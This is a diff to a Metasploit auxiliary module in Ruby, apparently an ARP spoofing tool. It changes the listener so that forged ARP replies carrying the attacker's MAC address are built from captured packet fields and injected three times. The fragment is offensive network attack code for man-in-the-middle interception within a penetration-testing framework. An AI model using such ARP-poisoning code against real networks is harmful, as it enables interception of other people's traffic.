@@ -402,8 +402,8 @@ class Metasploit3 < Msf::Auxiliary
 								if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
 								   (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
 									print_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}") if datastore['VERBOSE']
-									reply = buildreply(arp.tpa, @smac, arp.spa, arp.sha)
-									3.times{listener_capture.inject(reply)}
+									reply = buildreply(pkt.arp_daddr_ip, @smac, pkt.arp_saddr_ip, pkt.eth_saddr)
+									3.times{listener_capture.inject(reply.to_s)}
 								elsif args[:AUTO_ADD]
 									if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and 
 									    pkt.arp_saddr_ip != localip)
